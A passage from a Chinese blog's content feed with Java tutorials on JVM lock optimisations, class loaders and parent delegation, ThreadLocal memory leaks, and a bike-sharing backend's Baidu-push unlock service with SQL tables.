锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们上的锁进行消除。 对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁： 123public static String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; String 是一个不可变的类，Javac 编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作，在 JDK 1.5 及以后的版本中，会转化为 StringBuilder 对象的连续 append() 操作，即上面的代码可能会变成下面的样子： 1234567public static String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; 每个 StringBuffer.append() 方法中都有一个同步块，锁就是 sb 对象。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会“逃逸”到 concatString() 方法之外，其他线程无法访问到它。因此，虽然这里有锁，但是可以被安全地消除掉。 锁粗化如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。 上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。 轻量级锁JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。 以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 mark word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出，应该注意的是 state 表格不是存储在对象头中的。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。 下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。 轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。 当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。 如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。 偏向锁偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。 可以使用 -XX:+UseBiasedLocking=true 开启偏向锁，不过在 JDK 1.6 中它是默认开启的。 当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。 当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。 十三、多线程开发良好的实践 给线程起个有意义的名字，这样可以方便找 Bug。 缩小同步范围，例如对于 synchronized，应该尽量使用同步块而不是同步方法。 多用同步类少用 wait() 和 notify()。首先，CountDownLatch, Semaphore, CyclicBarrier 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现对复杂控制流的控制。其次，这些类是由最好的企业编写和维护，在后续的 JDK 中它们还会不断优化和完善，使用这些更高等级的同步工具你的程序可以不费吹灰之力获得优化。 多用并发集合少用同步集合。并发集合比同步集合的可扩展性更好，例如应该使用 ConcurrentHashMap 而不是 Hashtable。 使用本地变量和不可变类来保证线程安全。 使用线程池而不是直接创建 Thread 对象，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。 使用 BlockingQueue 实现生产者消费者问题。 转自：https://github.com/CyC2018/Interview-Notebook/blob/master/notes/Java%20%E5%B9%B6%E5%8F%91.md]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十三、整合百度云推送--开锁]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%B8%89%E3%80%81%E6%95%B4%E5%90%88%E7%99%BE%E5%BA%A6%E4%BA%91%E6%8E%A8%E9%80%81--%E5%BC%80%E9%94%81%2F</url>
    <content type="text"><![CDATA[整合百度云推送 1、导入依赖12345&lt;dependency&gt; &lt;groupId&gt;cn.featherfly&lt;/groupId&gt; &lt;artifactId&gt;bccs-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt;&lt;/dependency&gt; 2、百度云推送的工具类123456789101112131415161718192021222324252627282930313233public class BaiduPushUtil &#123; public static void pushMsgToSingleDevice(UserElement ue, String message) throws BikeException &#123; PushKeyPair pair = new PushKeyPair(Constants.BAIDU_YUN_PUSH_API_KEY, Constants.BAIDU_YUN_PUSH_SECRET_KEY); BaiduPushClient pushClient = new BaiduPushClient(pair, Constants.CHANNEL_REST_URL); try &#123; // 设置请求参数，创建请求实例 PushMsgToSingleDeviceRequest request = new PushMsgToSingleDeviceRequest(). addChannelId(ue.getPushChannelId()). addMsgExpires(new Integer(3600)). //设置消息的有效时间,单位秒,默认3600*5. addMessageType(1). //设置消息类型,0表示透传消息,1表示通知,默认为0. addMessage(message); //设置设备类型，deviceType =&gt; 1 for web, 2 for pc, // 3for android, 4 for ios, 5 for wp. if ("android".equals(ue.getPlatform())) &#123; request.addDeviceType(3); &#125; else if ("ios".equals(ue.getPlatform())) &#123; request.addDeviceType(4); &#125; // 执行Http请求 PushMsgToSingleDeviceResponse response = pushClient.pushMsgToSingleDevice(request); &#125; catch (PushClientException e) &#123; e.printStackTrace(); throw new BikeException(e.getMessage()); &#125; catch (PushServerException e) &#123; e.printStackTrace(); throw new BikeException(e.getErrorMsg()); &#125; &#125;&#125;对应的是各种key，从官网获取 3、开锁的contrller123456789101112131415161718@RequestMapping("/unLockBike")public ApiResult unLockBike(@RequestBody Bike bike) throws BikeException&#123; ApiResult&lt;List&lt;BikeLocation&gt;&gt; resp = new ApiResult&lt;&gt;(); try &#123; bikeService.unLockBike(getCurrentUser(),bike.getNumber()); resp.setMessage("等待单车解锁"); &#125; catch (BikeException e) &#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125; catch (Exception e) &#123; log.error("Fail to unlock bike ", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 4、相应的service:1234567891011121314151617181920212223242526272829303132333435363738394041424344@Overridepublic void unLockBike(UserElement currentUser, Long bikeNo) throws BikeException &#123; try &#123; //校验用户是否认证 User user = userMapper.selectByPrimaryKey(currentUser.getUserId()); if(user.getVerifyFlag() == NOT_VERYFY)&#123; throw new BikeException("用户尚未认证"); &#125; //检查用户是否有正在进行的骑行记录 RideRecord record = rideRecordMapper.selectRecordNotClosed(currentUser.getUserId()); if (record != null) &#123; throw new BikeException("存在未关闭骑行订单"); &#125; //检查用户余额是否大于一元 Wallet wallet = walletMapper.selectByUserId(currentUser.getUserId()); if (wallet.getRemainSum().compareTo(new BigDecimal(1)) &lt; 0) &#123; throw new BikeException("余额不足"); &#125; //推送单车 进行解锁 没有channelId 会报异常 /*JSONObject notification = new JSONObject(); notification.put("unlock", "unlock"); BaiduPushUtil.pushMsgToSingleDevice(currentUser,"&#123;\"title\":\"TEST\",\"description\":\"Hello Baidu push!\"&#125;");*/ //修改Monogodb状态 Query query = Query.query(Criteria.where("bike_no").is(bikeNo)); Update update = Update.update("status", BIKE_UNLOCK); mongoTemplate.updateFirst(query, update, "bike-position"); //创立骑行订单 记录骑行时间 RideRecord rideRecord = new RideRecord(); rideRecord.setBikeNo(bikeNo); String recordNo = new Date().toString() + System.currentTimeMillis() + RandomNumberCode.randomNo(); rideRecord.setRecordNo(recordNo); rideRecord.setStartTime(new Date()); rideRecord.setUserid(currentUser.getUserId()); rideRecordMapper.insertSelective(rideRecord); &#125;catch (Exception e)&#123; log.error("fail to un lock bike", e); throw new BikeException("解锁单车失败"); &#125;&#125; 其中用户骑行记录表： 12345678910111213141516171819202122-- ------------------------------ Table structure for ride_record-- ----------------------------DROP TABLE IF EXISTS `ride_record`;CREATE TABLE `ride_record` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `userid` bigint(20) NOT NULL, `record_no` varchar(100) NOT NULL COMMENT '订单编号', `bike_no` bigint(20) NOT NULL COMMENT '单车编号', `start_time` datetime NOT NULL COMMENT '开始骑行时间', `end_time` datetime DEFAULT NULL COMMENT '结束骑行时间', `ride_time` int(10) DEFAULT NULL COMMENT '骑行花费时间', `ride_cost` decimal(10,2) DEFAULT NULL COMMENT '骑行费用', `status` tinyint(2) NOT NULL DEFAULT '1' COMMENT '1 骑行中 2骑行结束', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;-- ------------------------------ Records of ride_record-- ----------------------------INSERT INTO `ride_record` VALUES ('1', '1', '1503396355465162725396', '28000001', '2017-08-22 18:06:30', '2017-08-22 19:42:15', '95', '4.00', '2');INSERT INTO `ride_record` VALUES ('2', '1', '15034158110391291507520', '28000001', '2017-08-22 23:30:11', '2017-08-22 23:58:21', '28', '1.00', '2'); 用户钱包： 12345678910111213141516-- ------------------------------ Table structure for wallet-- ----------------------------DROP TABLE IF EXISTS `wallet`;CREATE TABLE `wallet` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `userid` bigint(20) NOT NULL, `remain_sum` decimal(10,2) NOT NULL DEFAULT '0.00', `deposit` decimal(10,2) NOT NULL DEFAULT '0.00', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;-- ------------------------------ Records of wallet-- ----------------------------INSERT INTO `wallet` VALUES ('1', '1', '8.00', '300.00'); 用生成工具自动生成对应的dao和entity. 根据用户Id获取是否还有骑行未关锁的情况，就是检查他是否存在staus为1的情况： 12345&lt;select id="selectRecordNotClosed" resultMap="BaseResultMap" parameterType="java.lang.Long" &gt;select&lt;include refid="Base_Column_List" /&gt;from ride_record where userid = #&#123;userId&#125; AND status = 1&lt;/select&gt; 检查用户余额就更加简单了： 12345&lt;select id="selectByUserId" resultMap="BaseResultMap" parameterType="java.lang.Long" &gt;select&lt;include refid="Base_Column_List" /&gt;from wallet where userid = #&#123;userId,jdbcType=BIGINT&#125;&lt;/select&gt; 注意对mongodb的操作，使用spring data的查询进行的。需要引入： 12@Autowiredprivate MongoTemplate mongoTemplate; 5、测试：12345678@Testpublic void unlocak() throws BikeException&#123; UserElement ue = new UserElement(); ue.setUserId(1L); ue.setPushChannelId("123456"); ue.setPlatform("android"); bikeService.unLockBike(ue,28000003L);&#125; 选择的用户id为1，bike_no为28000003，运行之后会发现数据库多了一条正在骑行的记录。 并且查看Mongodb中bike_no为28000003的记录，此时状态也变成了1. 这个时候，整合流程可以走通。注意对mysql和mongodb的操作是不能保证事务的，只能保证Mysql的事务性。 1@Transactional 再次运行测试方法报异常： 解锁单车失败。 因为还存在处于骑行状态的单车，账号有异常。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十一、类加载器和双亲委派机制]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%B8%80%E3%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%92%8C%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[本章讲解虚拟机类加载器和双亲委派机制。 每个开发人员对java.lang.ClassNotFoundExcetpion这个异常肯定都不陌生，这个异常背后涉及到的是Java技术体系中的类加载机制。本文简述了JVM三种预定义类加载器，即启动类加载器、扩展类加载器和系统类加载器，并介绍和分析它们之间的关系和类加载所采用的双亲委派机制，给出并分析了与Java类加载原理相关的若干问题。 一. Java 虚拟机类加载器结构简述1. 什么是类加载器类加载机制的第一个阶段加载做的工作有： 1、通过一个类的全限定名（包名与类名）来获取定义此类的二进制字节流（Class文件）。而获取的方式，可以通过jar包、war包、网络中获取、JSP文件生成等方式。 2、将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。这里只是转化了数据结构，并未合并数据。（方法区就是用来存放已被加载的类信息，常量，静态变量，编译后的代码的运行时内存区域） 3、在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。这个Class对象并没有规定是在Java堆内存中，它比较特殊，虽为对象，但存放在方法区中。 其中，实现第一个工作的代码块就被称为“类加载器”。 2. 类加载器的作用类加载器的作用不仅仅是实现类的加载，它还与类的的“相等”判定有关，关系着Java“相等”判定方法的返回结果，只有在满足如下三个类“相等”判定条件，才能判定两个类相等。 1、两个类来自同一个Class文件 2、两个类是由同一个虚拟机加载 3、两个类是由同一个类加载器加载 3. JVM三种预定义类型类加载器我们首先看一下JVM预定义的三种类加载器，当JVM启动的时候，Java缺省开始使用如下三种类型的类加载器： 启动（Bootstrap）类加载器：引导类加载器是用 本地代码实现的类加载器，它负责将 &lt;JAVA_HOME&gt;/lib下面的核心类库 或 -Xbootclasspath选项指定的jar包等 虚拟机识别的类库 加载到内存中。由于引导类加载器涉及到虚拟机本地实现细节，开发者无法直接获取到启动类加载器的引用，所以 不允许直接通过引用进行操作。 扩展（Extension）类加载器：扩展类加载器是由Sun的ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的，它负责将 &lt;JAVA_HOME &gt;/lib/ext或者由系统变量-Djava.ext.dir指定位置中的类库 加载到内存中。开发者可以直接使用标准扩展类加载器。 系统（System/APP）类加载器或称为应用程序类加载器：系统类加载器是由 Sun 的 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的，它负责将 用户类路径(java -classpath或-Djava.class.path变量所指的目录，即当前类所在路径及其引用的第三方类库的路径，如第四节中的问题6所述)下的类库 加载到内存中。开发者可以直接使用系统类加载器。 Ps: 除了以上列举的三种类加载器，还有一种比较特殊的类型就是线程上下文类加载器。 4. 什么是双亲委派模型？首先，先要知道什么是类加载器。正如上面所说，类加载器就是根据指定全限定名称将class文件加载到JVM内存，转为Class对象。如果站在JVM的角度来看，只存在两种类加载器: 启动类加载器（Bootstrap ClassLoader）：由C++语言实现（针对HotSpot）,负责将存放在&lt;JAVA_HOME&gt;\lib目录或-Xbootclasspath参数指定的路径中的类库加载到内存中。 其他类加载器：由Java语言实现，继承自抽象类ClassLoader。如： 扩展类加载器（Extension ClassLoader）： 负责加载&lt;JAVA_HOME&gt;\lib\ext目录或java.ext.dirs系统变量指定的路径中的所有类库。 应用程序类加载器（Application ClassLoader）。 负责加载用户类路径（classpath）上的指定类库，我们可以直接使用这个类加载器。 一般情况，如果我们没有自定义类加载器默认就是用这个加载器。 5. 双亲委派模型工作过程？如果一个类加载器收到类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器完成。每个类加载器都是如此，只有当父加载器在自己的搜索范围内找不到指定的类时（即ClassNotFoundException），子加载器才会尝试自己去加载。 6. 为什么需要双亲委派模型？为什么需要双亲委派模型呢？假设没有双亲委派模型，试想一个场景： 黑客自定义一个java.lang.String类，该String类具有系统的String类一样的功能，只 是在某个函数稍作修改。比如equals函数，这个函数经常使用，如果在这这个函数中， 黑客加入一些“病毒代码”。并且通过自定义类加载器加入到JVM中。此时，如果没有双亲 委派模型，那么JVM就可能误以为黑客自定义的java.lang.String类是系统的String类， 导致“病毒代码”被执行。 而有了双亲委派模型，黑客自定义的java.lang.String类永远都不会被加载进内存。因为首先是最顶端的类加载器加载系统的java.lang.String类，最终自定义的类加载器无法加载java.lang.String类。 或许你会想，我在自定义的类加载器里面强制加载自定义的java.lang.String类，不去通过调用父加载器不就好了吗?确实，这样是可行。但是，在JVM中，判断一个对象是否是某个类型时，如果该对象的实际类型与待比较的类型的类加载器不同，那么会返回false。 举个简单例子： ClassLoader1、ClassLoader2都加载java.lang.String类，对应Class1、Class2对象。 那么Class1对象不属于ClassLoad2对象加载的java.lang.String类型。 委托机制的意义 — 防止内存中出现多份同样的字节码 比如两个类A和类B都要加载System类： 如果不用委托而是自己加载自己的，那么类A就会加载一份System字节码，然后类B又会加载一份System字节码，这样内存中就出现了两份System字节码。 如果使用委托机制，会递归的向父类查找，也就是首选用Bootstrap尝试加载，如果找不到再向下。这里的System就能在Bootstrap中找到然后加载，如果此时类B也要加载System，也从Bootstrap开始，此时Bootstrap发现已经加载过了System那么直接返回内存中的System即可而不需要重新加载，这样内存中就只有一份System的字节码了。 7. 如何实现双亲委派模型？通俗的讲，就是某个特定的类加载器在接到加载类的请求时，首先将加载任务委托给父类加载器，依次递归 (本质上就是loadClass函数的递归调用)。因此，所有的加载请求最终都应该传送到顶层的启动类加载器中。如果父类加载器可以完成这个类加载请求，就成功返回；只有当父类加载器无法完成此加载请求时，子加载器才会尝试自己去加载。事实上，大多数情况下，越基础的类由越上层的加载器进行加载，因为这些基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API（当然，也存在基础类回调用户用户代码的情形）。 关于虚拟机默认的双亲委派机制，我们可以从系统类加载器和扩展类加载器为例作简单分析。 上面两张图分别是标准扩展类加载器继承层次图和系统类加载器继承层次图。通过这两张图我们可以看出，扩展类加载器和系统类加载器均是继承自 java.lang.ClassLoader抽象类。我们就可以从java.lang.ClassLoader中的loadClass（String name）方法的代码中分析出虚拟机默认采用的双亲委派机制到底是什么模样： loadClass默认实现如下： 123public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; return loadClass(name, false);&#125; 再看看loadClass(String name, boolean resolve)函数： 12345678910111213141516171819202122232425262728293031323334353637protected Class&lt;?&gt; loadClass(String name, boolean resolve) throws ClassNotFoundException &#123; synchronized (getClassLoadingLock(name)) &#123; // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) &#123; long t0 = System.nanoTime(); try &#123; if (parent != null) &#123; c = parent.loadClass(name, false); &#125; else &#123; c = findBootstrapClassOrNull(name); &#125; &#125; catch (ClassNotFoundException e) &#123; // ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; 1. 首先，检查一下指定名称的类是否已经加载过，如果加载过了，就不需要再加载，直接返回。 2. 如果此类没有加载过，那么，再判断一下是否有父加载器；如果有父加载器，则由父加载器加载（即调用parent.loadClass(name, false);）.或者是调用bootstrap类加载器来加载。 3. 如果父加载器及bootstrap类加载器都没有找到指定的类，那么调用当前类加载器的findClass方法来完成类加载。 上面说的比较啰嗦，其实简单点，JVM类加载器的步骤模型为： 1.先检查需要加载的类是否已经被加载，这个过程是从下-------&gt; 上; 2.如果没有被加载，则委托父加载器加载，如果加载不了再由自己加载，这个过程是从上 ------&gt; 下; 话句话说，如果自定义类加载器，就必须重写findClass方法！ findClass的默认实现如下： 123protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name);&#125; 可以看出，抽象类ClassLoader的findClass函数默认是抛出异常的。而前面我们知道，loadClass在父加载器无法加载类的时候，就会调用我们自定义的类加载器中的findeClass函数，因此我们必须要在loadClass这个函数里面实现将一个指定类名称转换为Class对象. 如果是是读取一个指定的名称的类为字节数组的话，这很好办。但是如何将字节数组转为Class对象呢？很简单，Java提供了defineClass方法，通过这个方法，就可以把一个字节数组转为Class对象啦~ defineClass主要的功能是： 将一个字节数组转为Class对象，这个字节数组是class文件读取后最终的字节数组。 如，假设class文件是加密过的，则需要解密后作为形参传入defineClass函数。 defineClass默认实现如下： 1234protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len) throws ClassFormatError &#123; return defineClass(name, b, off, len, null);&#125; 8. 示例首先，我们定义一个待加载的普通Java类:Test.java。放在com.huachao.cl包下: 12345678package com.huachao.cl;public class Test &#123; public void hello() &#123; System.out.println(&quot;恩，是的，我是由 &quot; + getClass().getClassLoader().getClass() + &quot; 加载进来的&quot;); &#125;&#125; 如果你是直接在当前项目里面创建，待Test.java编译后，请把Test.class文件拷贝走，再将Test.java删除。因为如果Test.class存放在当前项目中，根据双亲委派模型可知，会通过sun.misc.Launcher$AppClassLoader 类加载器加载。为了让我们自定义的类加载器加载，我们把Test.class文件放入到其他目录。 在本例中，我们Test.class文件存放的目录如下： 接下来就是自定义我们的类加载器： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.io.FileInputStream;import java.lang.reflect.Method;public class Main &#123; //继承ClassLoader重写findClass方法 static class MyClassLoader extends ClassLoader &#123; private String classPath; public MyClassLoader(String classPath) &#123; this.classPath = classPath; &#125; //class文件读取后最终的字节数组 private byte[] loadByte(String name) throws Exception &#123; name = name.replaceAll("\\.", "/"); FileInputStream fis = new FileInputStream(classPath + "/" + name + ".class"); int len = fis.available(); byte[] data = new byte[len]; fis.read(data); fis.close(); return data; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; try &#123; byte[] data = loadByte(name); //将一个字节数组转为Class对象 return defineClass(name, data, 0, data.length); &#125; catch (Exception e) &#123; e.printStackTrace(); throw new ClassNotFoundException(); &#125; &#125; &#125;; public static void main(String args[]) throws Exception &#123; MyClassLoader classLoader = new MyClassLoader("D:/test"); Class clazz = classLoader.loadClass("com.huachao.cl.Test"); Object obj = clazz.newInstance(); Method helloMethod = clazz.getDeclaredMethod("hello", null); helloMethod.invoke(obj, null); &#125;&#125; 最后运行结果如下： 恩，是的，我是由 class Main$MyClassLoader 加载进来的 这样，就实现了由自定义类加载器加载指定路径下的class文件，然后实例化和得到类中的方法。 下面再看一个简单的双亲委派模型代码实例验证： 1234567891011121314public class ClassLoaderTest &#123; public static void main(String[] args)&#123; //输出ClassLoaderText的类加载器名称 System.out.println("ClassLoaderText类的加载器的名称:"+ClassLoaderTest.class.getClassLoader().getClass().getName()); System.out.println("System类的加载器的名称:"+System.class.getClassLoader()); System.out.println("List类的加载器的名称:"+List.class.getClassLoader()); ClassLoader cl = ClassLoaderTest.class.getClassLoader(); while(cl != null)&#123; System.out.print(cl.getClass().getName()+"-&gt;"); cl = cl.getParent(); &#125; System.out.println(cl); &#125; 输出结果为： 解释一下： 1、ClassLoaderTest类是用户定义的类，位于CLASSPATH下，由系统/应用程序类加载器加载。 2、System类与List类都属于Java核心类，由祖先类启动类加载器加载，而启动类加载器是在JVM内部通过C/C++实现的，并不是Java，自然也就不能继承ClassLoader类，自然就不能输出其名称。 3、而箭头项代表的就是类加载的流程，层级委托，从祖先类加载器开始，直到系统/应用程序类加载器处才被加载。 那么我们做个测试，把类打成jar包，拷贝入%JAVA_HOME%/jre/lib/ext目录下，再次运行ClassLoaderTest类： 解释一下，因为类的Jar包放到了ExtClassLoader的加载目录下，所以在根目录找不到相应类后，在ExtClassLoader处就完成了类加载，而忽略了APPClassLoader阶段。 这两个例子，第一个例子实现了自定义的类加载器，可以自己指定加载位置；第二个例子证明了如果ExtClassLoader可以处理，那么就忽略了APPClassLoader阶段。 对于《深入理解java虚拟机》的228页的代码7-8，演示了不同类加载器对instanceof关键字运算的结果的影响，证明了两个类，即使来自于同一个Class文件，但是由于类加载器的不同，这两个类仍然为独立的类。 http://blog.csdn.net/zhangliangzi/article/details/51338291 http://blog.csdn.net/huachao1001/article/details/52297075 http://blog.csdn.net/justloveyou_/article/details/72217806 http://blog.csdn.net/u013256816/article/details/50829656 https://github.com/kyle-liu/mynote/blob/master/classloader.md 沿用双亲委派机制自定义类加载器很简单，只需继承ClassLoader类并重写findClass方法即可。 打破双亲委派机制则不仅要继承ClassLoader类，还要重写loadClass和findClass方法（默认的loadClass方法是实现了双亲委派机制的逻辑，即会先让父类加载器加载，当无法加载时才由自己加载）]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十一、深入分析ThreadLocal内存泄漏问题]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%B8%80%E3%80%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90ThreadLocal%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ThreadLocal是面试重灾区，分为两篇来讲解其中的用法和原理。这是第二篇。 前言ThreadLocal 的作用是提供线程内的局部变量，这种变量在线程的生命周期内起作用，减少同一个线程内多个函数或者组件之间一些公共变量的传递的复杂度。但是如果滥用 ThreadLocal，就可能会导致内存泄漏。下面，我们将围绕三个方面来分析 ThreadLocal 内存泄漏的问题: ThreadLocal 实现原理 ThreadLocal为什么会内存泄漏 ThreadLocal 最佳实践 ThreadLocal 实现原理 ThreadLocal的实现是这样的：每个Thread 维护一个 ThreadLocalMap 映射表，这个映射表的 key 指向 ThreadLocal 实例本身，value 指向真正需要存储的 Object，这个值真实保存在线程实例上的。 也就是说 ThreadLocal 本身并不存储值，它只是作为一个 key 来让线程从 ThreadLocalMap 获取 value。值得注意的是图中的虚线，表示 ThreadLocalMap 是使用 ThreadLocal 的弱引用作为 Key 的，弱引用的对象在 GC 时会被回收。 这里一定要注意，ThreadLocal 本身并不存储值，它只是作为一个 key 来让线程从 ThreadLocalMap 获取 value。我们从get和set代码中可以看到ThreadLocalMap的key是ThreadLocal 实例本身。 123456789public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) //this在这里代表的是当前线程的ThreadLocal对象 map.set(this, value); else createMap(t, value);&#125; ThreadLocal为什么会内存泄漏ThreadLocalMap使用ThreadLocal的弱引用作为key,如果一个ThreadLocal没有外部强引用来引用它，那么系统 GC 的时候，这个ThreadLocal势必会被回收，这样一来，ThreadLocalMap中就会出现key为null的Entry，就没有办法访问这些key为null的Entry的value，如果当前线程再迟迟不结束的话，这些key为null的Entry的value就会一直存在一条强引用链：Thread Ref -&gt; Thread -&gt; ThreaLocalMap -&gt; Entry -&gt; value永远无法回收，造成内存泄漏。 其实，ThreadLocalMap的设计中已经考虑到这种情况，也加上了一些防护措施：在ThreadLocal的get(),set(),remove()的时候都会清除线程ThreadLocalMap里所有key为null的value。 但是这些被动的预防措施并不能保证不会内存泄漏： 使用static的ThreadLocal，延长了ThreadLocal的生命周期，可能导致的内存泄漏 分配使用了ThreadLocal又不再调用get(),set(),remove()方法，那么就会导致内存泄漏。 为什么使用弱引用从表面上看内存泄漏的根源在于使用了弱引用。网上的文章大多着重分析ThreadLocal使用了弱引用会导致内存泄漏，但是另一个问题也同样值得思考：为什么使用弱引用而不是强引用？ key 使用强引用：引用的ThreadLocal的对象被回收了，但是ThreadLocalMap还持有ThreadLocal的强引用，如果没有手动删除，ThreadLocal不会被回收，导致Entry内存泄漏。 key 使用弱引用：引用的ThreadLocal的对象被回收了，由于ThreadLocalMap持有ThreadLocal的弱引用，即使没有手动删除，ThreadLocal也会被回收。value在下一次ThreadLocalMap调用set,get，remove的时候会被清除。 比较两种情况，我们可以发现：由于ThreadLocalMap的生命周期跟Thread一样长，如果都没有手动删除对应key，都会导致内存泄漏，但是使用弱引用可以多一层保障：弱引用ThreadLocal不会内存泄漏，对应的value在下一次ThreadLocalMap调用set,get,remove的时候会被清除。 因此，ThreadLocal内存泄漏的根源是：由于ThreadLocalMap的生命周期跟Thread一样长，如果没有手动删除对应key就会导致内存泄漏，而不是因为弱引用。 ThreadLocal 最佳实践综合上面的分析，我们可以理解ThreadLocal内存泄漏的前因后果，那么怎么避免内存泄漏呢？ 每次使用完ThreadLocal，都调用它的remove()方法，清除数据。在使用线程池的情况下，没有及时清理ThreadLocal，不仅是内存泄漏的问题，更严重的是可能导致业务逻辑出现问题。所以，使用ThreadLocal就跟加锁完要解锁一样，用完就清理。 转自：http://blog.xiaohansong.com/2016/08/06/ThreadLocal-memory-leak/]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十一、整合完成编号连续递增]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%B8%80%E3%80%81%E6%95%B4%E5%90%88%E5%AE%8C%E6%88%90%E7%BC%96%E5%8F%B7%E8%BF%9E%E7%BB%AD%E9%80%92%E5%A2%9E%2F</url>
